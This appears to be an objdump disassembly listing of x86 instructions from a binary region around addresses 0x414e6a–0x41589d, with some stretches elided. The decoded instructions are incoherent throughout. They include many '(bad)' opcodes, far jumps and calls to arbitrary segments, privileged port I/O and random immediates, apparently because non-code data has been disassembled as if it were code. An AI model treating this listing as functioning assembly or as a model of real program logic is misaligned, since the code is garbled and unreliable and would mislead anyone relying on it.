  414e6a:	adc    esi,DWORD PTR [esi-0x7a]
  414e6d:	retf   0x1c52
  414e70:	std    
  414e71:	inc    esp
  414e72:	jo     0x414e55
  414e74:	jle    0x414e08
  414e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e77:	nop
  414e78:	ss loope 0x414e36
  414e7b:	xor    bh,al
  414e7d:	in     al,dx
  414e7e:	fcmovnbe st,st(1)
  414e80:	inc    ebp
  414e81:	ret    
  414e82:	loop   0x414e26
  414e84:	jmp    0xb8b:0x13c4f943
  414e8b:	ss mov ebx,0x7f6f865e
  414e91:	add    al,0x70
  414e93:	(bad)  
  414e94:	mov    edx,0x48d959a6
  414e99:	fwait
  414e9a:	mov    WORD PTR [edx],?
  414e9c:	loop   0x414e70
  414e9e:	icebp  
  414e9f:	sbb    bh,bh
  414ea1:	pop    esi
  414ea2:	jp     0x414e39
  414ea4:	xchg   edi,eax
  414ea5:	arpl   WORD PTR [ebp+0x2e5838fb],ax
  414eab:	pop    es
  414eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eae:	lahf   
  414eaf:	xor    BYTE PTR [edx],ch
  414eb1:	jae    0x414f09
  414eb3:	xchg   dx,ax
  414eb5:	cmp    BYTE PTR [esi-0x36],dh
  414eb8:	call   0x973:0x733064f2
  414ebf:	cwde   
  414ec0:	xchg   BYTE PTR [eax],dh
  414ec2:	clc    
  414ec3:	mov    ds:0xd39e4e20,al
  414ec8:	outs   dx,BYTE PTR ds:[esi]
  414ec9:	ror    DWORD PTR [edi+0x67],1
  414ecc:	sub    cl,cl
  414ece:	and    al,0xe9
  414ed0:	loop   0x414eee
  414ed2:	ins    DWORD PTR es:[edi],dx
  414ed3:	aad    0xb8
  414ed5:	pop    ebx
  414ed6:	xchg   edi,eax
  414ed7:	cmp    al,0x9a
  414ed9:	adc    eax,0xa03a352c
  414ede:	push   ds
  414edf:	jg     0x414eaa
  414ee1:	and    cl,BYTE PTR [eiz*4+0x5b3d6878]
  414ee8:	retf   
  414ee9:	idiv   cl
  414eeb:	xlat   BYTE PTR ds:[ebx]
  414eec:	lods   al,BYTE PTR ds:[esi]
  414eed:	adc    bh,BYTE PTR [ecx+0x79]
  414ef0:	(bad)  
  414ef1:	ficom  WORD PTR [eax+edx*4-0x37]
  414ef5:	ds pop edi
  414ef7:	pop    ecx
  414ef8:	jmp    0x86b8:0x3ab982a1
  414eff:	push   cs
  414f00:	xlat   BYTE PTR ds:[ebx]
  414f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f02:	aad    0xf8
  414f04:	inc    eax
  414f05:	adc    eax,ebx
  414f07:	jae    0x414f50
  414f09:	jecxz  0x414efe
  414f0b:	or     eax,0x841a45d0
	...
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x3bc0e2c4
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	and    cl,BYTE PTR [ecx+0x3e]
  414f8f:	pop    esi
  414f90:	stc    
  414f91:	fidiv  DWORD PTR [ebp+0x58]
  414f94:	stc    
  414f95:	call   0x603c7653
  414f9a:	mov    esi,0xd13a2cd8
  414f9f:	(bad)  
  414fa0:	in     al,0x12
  414fa2:	jmp    0x415019
  414fa4:	sbb    edx,DWORD PTR [edi+0x6fa72fb5]
  414faa:	aad    0x73
  414fac:	inc    eax
  414fad:	inc    esp
  414fae:	and    ch,BYTE PTR [ebp-0x353fa68e]
  414fb4:	not    ah
  414fb6:	xchg   ebp,eax
  414fb7:	outs   dx,DWORD PTR ds:[esi]
  414fb8:	jmp    0x415038
  414fba:	inc    esi
  414fbb:	sub    al,ah
  414fbd:	or     esi,DWORD PTR [eax-0x47]
  414fc0:	aad    0x9a
  414fc2:	mov    ds:0x7b96c2b5,eax
  414fc7:	fs addr16 jg 0x414f84
  414fcb:	mov    eax,0xcf4b036
  414fd0:	in     al,dx
  414fd1:	or     al,0x62
  414fd3:	in     al,0xc5
  414fd5:	scas   eax,DWORD PTR es:[edi]
  414fd6:	xor    DWORD PTR [esi+0x62a9a45e],0x5a
  414fdd:	mov    bl,0xa5
  414fdf:	retf   0x72aa
  414fe2:	dec    edx
  414fe3:	out    dx,eax
  414fe4:	push   es
  414fe5:	pop    edi
  414fe6:	push   eax
  414fe7:	scas   al,BYTE PTR es:[edi]
  414fe8:	(bad)  
  414fe9:	jnp    0x415031
  414feb:	scas   eax,DWORD PTR es:[edi]
  414fec:	xor    al,0x65
  414fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fef:	pop    ds
  414ff0:	or     ch,cl
  414ff2:	mov    al,0x83
  414ff4:	test   cl,dh
  414ff6:	push   ds
  414ff7:	add    BYTE PTR [ebp-0x5f529a6c],ch
  414ffd:	call   0xadee:0xe7620066
  415004:	aaa    
  415005:	iret   
  415006:	outs   dx,DWORD PTR ds:[esi]
  415007:	cdq    
  415008:	pop    edx
  415009:	pop    es
  41500a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41500b:	push   eax
  41500c:	or     BYTE PTR [edi-0x6492b2a],dh
  415012:	adc    bl,BYTE PTR [ebp+0x4264ad4a]
  415018:	sbb    al,0x21
  41501a:	test   BYTE PTR [eax+edx*8+0x394a1b43],al
  415021:	test   ebp,edx
  415023:	out    dx,eax
  415024:	xchg   ebx,eax
  415025:	push   cs
  415026:	adc    BYTE PTR [esi+ebp*2+0x1],al
  41502a:	out    0x80,al
  41502c:	into   
  41502d:	inc    eax
  41502e:	sub    DWORD PTR [ecx+edi*2+0x4c],0x3e
  415033:	mov    ecx,0x5e51a47c
  415039:	cmp    BYTE PTR [edx+0x1dd4aa06],ch
  41503f:	and    ah,BYTE PTR [ebx+ebx*4]
  415042:	sub    al,0x99
  415044:	push   cs
  415045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415046:	mov    esi,0xf7ac38a
  41504b:	mov    al,0x9f
  41504d:	enter  0x21dd,0x3f
  415051:	push   ss
  415052:	cmp    BYTE PTR [ecx-0x36],ch
  415055:	daa    
  415056:	xchg   DWORD PTR [eax],esi
  415058:	push   edx
  415059:	mov    cs,WORD PTR [eax-0x60]
  41505c:	push   es
  41505d:	in     eax,0xa6
  41505f:	nop
  415060:	(bad)  
  415061:	and    BYTE PTR [ebx-0x6c],cl
  415064:	shr    BYTE PTR [ecx+0x38],1
  415067:	add    ch,0x1c
  41506a:	jg     0x41507b
  41506c:	aas    
  41506d:	sub    al,0x94
  41506f:	mov    esp,eax
  415071:	idiv   ah
  415073:	test   DWORD PTR [edi+edi*2+0x4bcd25a8],esp
  41507a:	and    bh,dl
  41507c:	idiv   DWORD PTR [esi-0x1ffb5cf8]
  415082:	sub    DWORD PTR [edx+0x8887f05],eax
  415088:	dec    ecx
  415089:	jmp    0xc798:0x22329548
	...
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x70c2fc2d
  415102:	inc    eax
  415103:	mov    cs,WORD PTR [esi+ebx*8]
  415106:	add    BYTE PTR [eax],al
  415108:	add    al,0x1
  41510a:	add    BYTE PTR [eax],al
  41510c:	fs and edx,0x747ac4e9
  415113:	in     eax,dx
  415114:	lds    edi,FWORD PTR [edi]
  415116:	adc    al,BYTE PTR [esi+ebx*8-0xa91993e]
  41511d:	mov    dh,0xf6
  41511f:	cld    
  415120:	dec    esi
  415121:	mov    esp,ss
  415123:	mov    WORD PTR [edi],es
  415125:	mov    bh,0x1
  415127:	mov    eax,0xc336c6c1
  41512c:	xor    ah,BYTE PTR [eax+0x36]
  41512f:	pop    esp
  415130:	sub    dh,ah
  415132:	pushf  
  415133:	mov    ds:0x7d79cce,eax
  415138:	test   BYTE PTR [edi+0x1825215a],ch
  41513e:	pop    es
  41513f:	dec    eax
  415140:	inc    ecx
  415141:	sub    DWORD PTR [edx+0x66],eax
  415144:	iret   
  415145:	pushf  
  415146:	icebp  
  415147:	cwde   
  415148:	xlat   BYTE PTR ds:[ebx]
  415149:	stc    
  41514a:	mov    al,0xe6
  41514c:	mov    ch,0xc
  41514e:	fst    DWORD PTR [edi]
  415150:	or     eax,DWORD PTR [edx+ebp*8]
  415153:	xchg   esi,eax
  415154:	call   0xb548:0x57e3cc4d
  41515b:	jmp    0x4150f1
  41515d:	inc    ebp
  41515e:	int3   
  41515f:	mov    gs,WORD PTR [eax+esi*4-0x5b]
  415163:	js     0x4151d9
  415165:	pop    esi
  415166:	clc    
  415167:	dec    ebp
  415168:	retf   
  415169:	push   esi
  41516a:	sbb    eax,0x9654a0d0
  41516f:	clc    
  415170:	stc    
  415171:	or     cl,BYTE PTR [edi-0x58aa02e8]
  415177:	mov    dh,0xe9
  415179:	rol    DWORD PTR [ebx],cl
  41517b:	inc    esi
  41517c:	arpl   WORD PTR [ecx-0x40],cx
  41517f:	aad    0x1b
  415181:	adc    eax,0x382c69e1
  415186:	or     eax,0xe4b74613
  41518b:	sub    dl,bh
  41518d:	mov    edx,0x460d09f5
  415192:	inc    edi
  415193:	enter  0xb5eb,0x6b
  415197:	xchg   esp,esi
  415199:	daa    
  41519a:	push   ss
  41519b:	in     al,0x4
  41519d:	cmc    
  41519e:	push   esi
  41519f:	or     DWORD PTR [esi+0x62],edx
  4151a2:	test   edi,ebp
  4151a4:	push   0xffffffe4
  4151a6:	ret    0xfa6c
  4151a9:	in     al,0xc2
  4151ab:	xor    eax,0xe826c752
  4151b0:	nop
  4151b1:	(bad)  
  4151b2:	cld    
  4151b3:	jns    0x415207
  4151b5:	sbb    BYTE PTR [ebp-0x3a7d227e],al
  4151bb:	jle    0x4151b0
  4151bd:	je     0x4151eb
  4151bf:	cli    
  4151c0:	cmp    edi,ebp
  4151c2:	adc    DWORD PTR [edx],0xffffffa5
  4151c5:	cmp    ecx,DWORD PTR [edi+esi*1+0x3ddbefb8]
  4151cc:	push   es
  4151cd:	inc    ebx
  4151ce:	or     al,BYTE PTR [edx+eiz*2]
  4151d1:	adc    al,0xf7
  4151d3:	lds    edi,FWORD PTR [ebx+esi*8+0x5b]
  4151d7:	sub    dl,BYTE PTR [eax-0x1833a763]
  4151dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151de:	inc    edi
  4151df:	aad    0x32
  4151e1:	push   es
  4151e2:	out    dx,eax
  4151e3:	xchg   edi,esp
  4151e5:	shl    DWORD PTR [esi],1
  4151e7:	pusha  
  4151e8:	jne    0x415172
  4151ea:	pop    eax
  4151eb:	xchg   esp,eax
  4151ec:	nop
  4151ed:	xchg   ebp,eax
  4151ee:	test   BYTE PTR [ebp-0x7f],0x45
  4151f2:	je     0x41517b
  4151f4:	inc    edx
  4151f5:	inc    ebx
  4151f6:	dec    esp
  4151f7:	or     eax,0x66268a50
  4151fc:	mov    ds:0x2f658e8d,eax
  415201:	ds push ecx
  415203:	add    bl,0x3e
  415206:	and    al,0x22
  415208:	in     al,dx
  415209:	(bad)  
  41520a:	pop    edx
  41520b:	call   0x0:0xe3667df3
	...
  415272:	add    BYTE PTR [eax],al
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x28bd420b
  415283:	rcl    BYTE PTR [eax],cl
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR [ecx+eax*1],al
  41528a:	add    BYTE PTR [eax],al
  41528c:	fild   WORD PTR [edx]
  41528e:	sub    BYTE PTR [esi-0x16],bl
  415291:	out    dx,eax
  415292:	add    BYTE PTR [ecx],cl
  415294:	push   esp
  415295:	xor    ecx,DWORD PTR [ebp+0x44b080e5]
  41529b:	sti    
  41529c:	out    0xea,eax
  41529e:	rcr    BYTE PTR [esi+0x71],cl
  4152a1:	jg     0x415296
  4152a3:	aam    0x20
  4152a5:	call   0xda23:0x7bc72976
  4152ac:	stc    
  4152ad:	mov    al,0x22
  4152af:	pop    ebp
  4152b0:	sub    DWORD PTR [ebx-0xa],ebx
  4152b3:	push   esi
  4152b4:	(bad)  
  4152b5:	scas   al,BYTE PTR es:[edi]
  4152b6:	or     BYTE PTR [eax+0x5ec80d61],ch
  4152bc:	es icebp 
  4152be:	imul   ebx,DWORD PTR [edi+0x52],0xb4f0ea13
  4152c5:	mov    ch,bh
  4152c7:	aas    
  4152c8:	sub    DWORD PTR [ebp+0x41],eax
  4152cb:	jbe    0x415314
  4152cd:	push   esi
  4152ce:	out    0x24,eax
  4152d0:	sub    BYTE PTR [edx+0x348083fc],ah
  4152d6:	into   
  4152d7:	js     0x415281
  4152d9:	jnp    0x415354
  4152db:	cmc    
  4152dc:	mov    eax,DWORD PTR [esi+0xd]
  4152df:	jl     0x4152ea
  4152e1:	mov    ds:0x88cc0776,al
  4152e6:	rcl    BYTE PTR [edx+edi*1],1
  4152e9:	or     al,0x32
  4152eb:	daa    
  4152ec:	mov    ebx,0x9d1d7c3e
  4152f1:	and    al,BYTE PTR [esi-0x1fe13f23]
  4152f7:	hlt    
  4152f8:	inc    ebx
  4152f9:	pop    ebx
  4152fa:	pop    edi
  4152fb:	stos   BYTE PTR es:[edi],al
  4152fc:	and    bl,BYTE PTR [ebp+0x5f]
  4152ff:	and    ebx,esp
  415301:	mov    edi,ebx
  415303:	push   0x46
  415305:	scas   eax,DWORD PTR es:[edi]
  415306:	leave  
  415307:	cmp    dh,dh
  415309:	xor    DWORD PTR [eax-0x30db26af],ebx
  41530f:	mov    ecx,0x8cfb6ab1
  415314:	data16 sbb dh,BYTE PTR [ebx]
  415317:	inc    eax
  415318:	les    eax,FWORD PTR ds:0x3007c19f
  41531e:	test   eax,0x22467fb1
  415323:	push   esi
  415324:	jo     0x4152ce
  415326:	ja     0x4152d6
  415328:	cld    
  415329:	xchg   cl,cl
  41532b:	mov    dh,0x95
  41532d:	add    al,0xb9
  41532f:	cmc    
  415330:	push   edi
  415331:	pop    ebx
  415332:	mov    al,0x3a
  415334:	ja     0x415377
  415336:	stc    
  415337:	dec    esp
  415338:	xlat   BYTE PTR ss:[ebx]
  41533a:	inc    esp
  41533b:	sar    ch,cl
  41533d:	dec    ebp
  41533e:	or     al,0x6a
  415340:	daa    
  415341:	push   ebx
  415342:	adc    esi,eax
  415344:	repz int3 
  415346:	sbb    BYTE PTR [edi],dh
  415348:	xor    bh,BYTE PTR [eax+0x3e]
  41534b:	sbb    bl,ah
  41534d:	cmp    al,0x2f
  41534f:	cdq    
  415350:	dec    BYTE PTR [esi-0x28b7ff85]
  415356:	daa    
  415357:	test   BYTE PTR [edi],ah
  415359:	adc    al,0x52
  41535b:	ds cwde 
  41535d:	out    dx,al
  41535e:	rcl    DWORD PTR [edi-0x73],0x78
  415362:	lods   al,BYTE PTR ds:[esi]
  415363:	scas   eax,DWORD PTR es:[edi]
  415364:	int3   
  415365:	push   ebx
  415366:	push   es
  415367:	jns    0x415307
  415369:	jecxz  0x4153b3
  41536b:	retf   0x2244
  41536e:	pusha  
  41536f:	test   ah,bh
  415371:	fistp  WORD PTR [ebp-0x7a06a37c]
  415377:	ja     0x4152fb
  415379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41537a:	push   cs
  41537b:	icebp  
  41537c:	push   es
  41537d:	jmp    0x1371:0x523fd93
  415384:	xor    esi,DWORD PTR [edi+esi*1]
  415387:	cld    
  415388:	aas    
  415389:	iret   
  41538a:	shl    BYTE PTR [esi],cl
  41538c:	pop    ecx
  41538d:	or     ch,BYTE PTR [esi+0x69]
	...
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x22d3e5b0
  415401:	sbb    BYTE PTR [edx+eiz*2+0x14],cl
  415405:	loopne 0x415407
  415407:	add    BYTE PTR [ecx+eax*1],al
  41540a:	add    BYTE PTR [eax],al
  41540c:	scas   al,BYTE PTR es:[edi]
  41540d:	inc    esi
  41540e:	lock xlat BYTE PTR ds:[ebx]
  415410:	push   esi
  415411:	cmp    eax,0xa3cf93e0
  415416:	push   ds
  415417:	xor    DWORD PTR [eax],ebp
  415419:	dec    edi
  41541a:	cmp    al,0x6c
  41541c:	fcom   st(4)
  41541e:	and    al,0x2a
  415420:	int    0x42
  415422:	xor    BYTE PTR [ebx],al
  415424:	shl    dh,1
  415426:	neg    ebp
  415428:	loope  0x415473
  41542a:	xchg   esi,eax
  41542b:	icebp  
  41542c:	inc    ebx
  41542d:	es test eax,0x73339410
  415433:	jge    0x4154a1
  415435:	dec    edx
  415436:	xlat   BYTE PTR ds:[ebx]
  415437:	std    
  415438:	lds    ebx,FWORD PTR [eax+0x4cbe8449]
  41543e:	fsub   DWORD PTR [ebp+0x3212aead]
  415444:	mov    ebx,cs
  415446:	push   ebx
  415447:	sar    ebp,1
  415449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41544a:	push   ss
  41544b:	cmovae esi,DWORD PTR [ebp+0x2d433c46]
  415452:	push   esp
  415453:	pop    ebp
  415454:	sub    eax,0x784a29e3
  415459:	outs   dx,BYTE PTR ds:[esi]
  41545a:	or     DWORD PTR [edi],esi
  41545c:	int3   
  41545d:	into   
  41545e:	call   0x30b7c6ad
  415463:	fwait
  415464:	inc    ebp
  415465:	adc    BYTE PTR [ebp+0x2dacd880],dh
  41546b:	jo     0x4154ce
  41546d:	pand   mm2,QWORD PTR [esi]
  415470:	sub    bl,BYTE PTR [ecx]
  415472:	in     al,dx
  415473:	mov    ch,0x78
  415475:	mov    eax,0xf658190f
  41547a:	pop    ds
  41547b:	ficomp DWORD PTR [ecx+0x3c]
  41547e:	fcomip st,st(6)
  415480:	push   ebx
  415481:	repz std 
  415483:	ja     0x415497
  415485:	(bad)  
  415486:	fst    st(2)
  415488:	out    0x69,al
  41548a:	retf   
  41548b:	sub    esp,DWORD PTR [esi+0x19]
  41548e:	ins    DWORD PTR es:[edi],dx
  41548f:	or     eax,0x85812d3e
  415494:	ins    BYTE PTR es:[edi],dx
  415495:	and    dl,bl
  415497:	and    dh,BYTE PTR [ebx]
  415499:	sbb    edx,esp
  41549b:	(bad)  
  41549c:	cwde   
  41549d:	dec    edi
  41549e:	and    edx,edi
  4154a0:	mov    ds:0xe534c1f6,eax
  4154a5:	pop    ebp
  4154a6:	push   esp
  4154a7:	xor    eax,0xe17460c8
  4154ac:	fcmovne st,st(3)
  4154ae:	std    
  4154af:	aaa    
  4154b0:	fistp  QWORD PTR [ebx]
  4154b2:	push   esi
  4154b3:	dec    ebp
  4154b4:	clc    
  4154b5:	aas    
  4154b6:	jnp    0x4154bb
  4154b8:	push   0x91f284e3
  4154bd:	test   al,0x35
  4154c0:	xor    esi,0xd2cc155d
  4154c6:	lea    eax,[ecx+0x1f37d97f]
  4154cc:	push   edx
  4154cd:	enter  0x62f1,0x71
  4154d1:	fs cmp eax,0x9b272491
  4154d7:	iret   
  4154d8:	in     al,dx
  4154d9:	mov    ss,WORD PTR [esi-0x4f]
  4154dc:	xchg   ebx,eax
  4154dd:	cmp    al,0xa
  4154df:	test   eax,0x4a85d3e5
  4154e4:	dec    ecx
  4154e5:	sub    BYTE PTR [eax+ecx*4-0x33c799fe],ch
  4154ec:	cmp    dl,BYTE PTR [ebx]
  4154ee:	dec    eax
  4154ef:	retf   
  4154f0:	cmp    eax,0x908d05f3
  4154f5:	inc    ebp
  4154f6:	ss lock sub al,0xe2
  4154fa:	lods   eax,DWORD PTR ds:[esi]
  4154fb:	ja     0x41554f
  4154fd:	dec    ecx
  4154fe:	hlt    
  4154ff:	cld    
  415500:	out    0xc1,al
  415502:	in     eax,dx
  415503:	dec    ebp
  415504:	imul   edx,DWORD PTR [esi-0x50],0xffffffd6
  415508:	pop    edx
  415509:	mov    ecx,0xb326f325
  41550e:	loope  0x4154b2
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x415531
  415581:	sti    
  415582:	inc    esi
  415583:	xchg   edx,eax
  415584:	sbb    cl,ah
  415586:	add    BYTE PTR [eax],al
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	inc    esp
  41558d:	bswap  esp
  41558f:	shl    BYTE PTR [ecx],0xad
  415592:	push   edx
  415593:	push   es
  415594:	cmp    al,0x2b
  415596:	es sub eax,esi
  415599:	out    dx,eax
  41559a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41559b:	sub    al,0xe9
  41559d:	clc    
  41559e:	int    0xa
  4155a0:	dec    eax
  4155a1:	ret    0xa02
  4155a4:	push   esp
  4155a5:	(bad)  
  4155a6:	mov    ch,BYTE PTR ss:[ecx]
  4155a9:	jle    0x41558f
  4155ab:	push   ebp
  4155ac:	xchg   esp,eax
  4155ad:	mov    ah,0xd7
  4155af:	mov    al,ds:0x5ba3374c
  4155b4:	imul   ebp,DWORD PTR [ebp-0x51c67ee],0x71e29beb
  4155be:	mov    esi,0x219a949c
  4155c3:	push   esp
  4155c4:	dec    ecx
  4155c5:	xchg   ebx,eax
  4155c6:	jle    0x41555a
  4155c8:	add    edi,edi
  4155ca:	test   BYTE PTR [esp+edi*1+0x40],cl
  4155ce:	lods   al,BYTE PTR ds:[esi]
  4155cf:	adc    al,0x74
  4155d1:	fsubr  st,st(0)
  4155d3:	ins    BYTE PTR es:[edi],dx
  4155d4:	add    ch,dh
  4155d6:	sbb    bl,bl
  4155d8:	ret    0xb560
  4155db:	inc    esp
  4155dc:	fsin   
  4155de:	pop    ebp
  4155df:	xchg   BYTE PTR [ebp+0x5d68189d],ah
  4155e5:	bound  edi,QWORD PTR [ecx]
  4155e7:	std    
  4155e8:	xor    al,0x21
  4155ea:	or     eax,DWORD PTR [edx]
  4155ec:	cld    
  4155ed:	mov    esi,0x4f147a3a
  4155f2:	push   ebx
  4155f3:	push   eax
  4155f4:	push   ds
  4155f5:	retf   0x6f91
  4155f8:	push   es
  4155f9:	bound  edi,QWORD PTR [eax+0x25]
  4155fc:	sub    ecx,DWORD PTR [esi+0x79]
  4155ff:	mov    ds:0x49c4b17e,al
  415604:	inc    esi
  415605:	int3   
  415606:	retf   0x1482
  415609:	push   edx
  41560a:	repnz pop esp
  41560c:	lods   al,BYTE PTR ds:[esi]
  41560d:	or     esi,DWORD PTR [edi+ecx*4+0x6069d4e]
  415614:	enter  0xaaa6,0xed
  415618:	mov    bl,0x7
  41561a:	dec    edi
  41561b:	push   cs
  41561c:	jns    0x4155f0
  41561e:	js     0x4155f8
  415620:	add    DWORD PTR [esi-0x3430ac82],0x34
  415627:	pop    es
  415628:	mov    ds:0xb6bc1d1,al
  41562d:	je     0x4155bc
  41562f:	aas    
  415630:	jo     0x41561c
  415632:	jo     0x4155fc
  415634:	(bad)  
  415635:	xchg   esp,eax
  415636:	je     0x4156a0
  415638:	push   eax
  415639:	popf   
  41563a:	test   DWORD PTR [ecx],edi
  41563c:	stos   BYTE PTR es:[edi],al
  41563d:	imul   eax,DWORD PTR [esi],0xffffffd7
  415640:	nop
  415641:	js     0x4156b6
  415643:	push   ebx
  415644:	dec    esp
  415645:	aaa    
  415646:	fcmovb st,st(7)
  415648:	int    0xf3
  41564a:	ficomp WORD PTR [eax-0x3a]
  41564d:	sahf   
  41564e:	int    0x1a
  415650:	sub    BYTE PTR [edi+0x50a15e15],ah
  415656:	fdiv   DWORD PTR [ebx]
  415658:	aaa    
  415659:	aas    
  41565a:	je     0x41568a
  41565c:	xor    al,0x25
  41565e:	and    BYTE PTR [ebp+0x732f52cb],0x67
  415665:	ins    DWORD PTR es:[edi],dx
  415666:	(bad)  
  415667:	fisubr DWORD PTR [eax]
  415669:	ds in  al,0x28
  41566c:	sub    esi,DWORD PTR [ebp+0x56]
  41566f:	scas   eax,DWORD PTR es:[edi]
  415670:	cmc    
  415671:	pop    esi
  415672:	inc    ebp
  415673:	adc    DWORD PTR [edx],edi
  415675:	inc    esi
  415676:	out    dx,eax
  415677:	imul   esi,ecx,0x48
  41567a:	jb     0x415690
  41567c:	and    DWORD PTR [ebx+edx*2+0x3486838],eax
  415683:	arpl   si,dx
  415685:	hlt    
  415686:	xlat   BYTE PTR ds:[ebx]
  415687:	push   es
  415688:	push   edi
  415689:	push   ebp
  41568a:	dec    edi
  41568b:	mov    al,ds:0x284ee322
	...
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0xb
  415701:	js     0x41575f
  415703:	call   0x423924
  415708:	add    al,0x1
  41570a:	add    BYTE PTR [eax],al
  41570c:	arpl   WORD PTR [ebx-0x1376b561],dx
  415712:	inc    eax
  415713:	dec    ecx
  415714:	fild   QWORD PTR [esp+ecx*1+0x3e]
  415718:	into   
  415719:	daa    
  41571a:	retf   0x84f0
  41571d:	sub    ebp,DWORD PTR [ecx-0x278fc0b3]
  415723:	sbb    dh,BYTE PTR [edi]
  415725:	cdq    
  415726:	xor    edx,DWORD PTR [edx]
  415728:	push   esi
  415729:	cmp    bh,dl
  41572b:	jnp    0x41579a
  41572d:	scas   al,BYTE PTR es:[edi]
  41572e:	mov    dl,0xb
  415730:	cmp    edi,ebp
  415732:	dec    edx
  415733:	hlt    
  415734:	lds    ecx,FWORD PTR [eax+0x20]
  415737:	ja     0x4156cb
  415739:	inc    edi
  41573a:	loop   0x415736
  41573c:	cmp    bl,cl
  41573e:	sbb    ecx,edi
  415740:	xor    eax,0x4755f568
  415745:	and    eax,0x9f1ffda
  41574a:	(bad)  [ecx+0x59]
  41574d:	(bad)  
  41574e:	sbb    ebp,DWORD PTR [ebx-0x38]
  415751:	jns    0x415716
  415753:	(bad)  
  415754:	mov    ah,0x5c
  415756:	iret   
  415757:	fwait
  415758:	mov    bl,BYTE PTR [eax+ebx*2-0x44faf7ed]
  41575f:	lea    ecx,[ebx]
  415761:	dec    esi
  415762:	pushf  
  415763:	es mov ecx,0x6f4bbd59
  415769:	leave  
  41576a:	mov    edx,0x51b09072
  41576f:	xor    cl,BYTE PTR [edx-0x75]
  415772:	(bad)  
  415773:	cmp    cl,BYTE PTR [edx]
  415775:	popa   
  415776:	repz out dx,eax
  415778:	daa    
  415779:	out    0x7f,eax
  41577b:	outs   dx,BYTE PTR ds:[esi]
  41577c:	mov    BYTE PTR [ecx-0x1fec0554],dh
  415782:	aad    0xab
  415784:	or     bl,cl
  415786:	scas   al,BYTE PTR es:[edi]
  415787:	fisttp DWORD PTR [ebp+eiz*2-0x51]
  41578b:	sbb    al,0x92
  41578d:	leave  
  41578e:	retf   
  41578f:	in     al,dx
  415790:	out    0xa4,al
  415792:	rol    bh,0x26
  415795:	test   eax,0xe50ff000
  41579a:	cs dec eax
  41579c:	sti    
  41579d:	push   0x4a390e7
  4157a2:	test   al,0x54
  4157a4:	sub    bl,0x8b
  4157a7:	dec    eax
  4157a8:	shl    ecx,cl
  4157aa:	jo     0x415778
  4157ac:	fs push ds
  4157ae:	mov    ds:0xf8214604,al
  4157b3:	sub    eax,0x45e91d02
  4157b8:	xor    ah,BYTE PTR [edx-0x5b]
  4157bb:	pushf  
  4157bc:	lods   al,BYTE PTR ds:[esi]
  4157bd:	in     al,0x1d
  4157bf:	lds    edi,FWORD PTR [edi-0x24170366]
  4157c5:	imul   esi,DWORD PTR [edx+0x26e1a0cd],0x5ce58e40
  4157cf:	fidiv  WORD PTR [esi]
  4157d1:	push   cs
  4157d2:	popf   
  4157d3:	cmp    BYTE PTR [edi],al
  4157d5:	and    edx,edi
  4157d7:	jge    0x415826
  4157d9:	ja     0x415766
  4157db:	out    0xe7,eax
  4157dd:	xchg   BYTE PTR [esi-0x3e],bl
  4157e0:	repnz sti 
  4157e2:	mov    ah,0x79
  4157e4:	push   ebp
  4157e5:	or     ebx,DWORD PTR [ecx-0x3e]
  4157e8:	stos   DWORD PTR es:[edi],eax
  4157e9:	out    0x3c,al
  4157eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157ec:	mov    ebx,0xcbc708ac
  4157f1:	fld    TBYTE PTR [ebx]
  4157f3:	sub    BYTE PTR [esi],bl
  4157f5:	and    BYTE PTR [edi],bl
  4157f7:	cmp    eax,0x2275fd0d
  4157fc:	rol    edx,1
  4157fe:	sahf   
  4157ff:	pop    edx
  415800:	imul   eax,DWORD PTR [esi+0x1387d65],0xa
  415807:	dec    ecx
  415808:	push   edi
  415809:	xchg   edx,eax
  41580a:	jne    0x415860
  41580c:	dec    edx
  41580d:	mov    cl,0x3e
  41580f:	call   0x415814
	...
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	shl    DWORD PTR [edx],cl
  415881:	mov    dl,0x50
  415883:	and    al,0x20
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR [ecx+eax*1],al
  41588a:	add    BYTE PTR [eax],al
  41588c:	xlat   BYTE PTR ds:[ebx]
  41588d:	cmp    al,0x2
  41588f:	push   es
  415890:	cmp    edx,DWORD PTR [edi+0x47837e04]
  415896:	test   BYTE PTR [esi],ah
  415898:	into   
  415899:	jae    0x415898
  41589b:	fsub   QWORD PTR [ebx]
  41589d:	push   eax
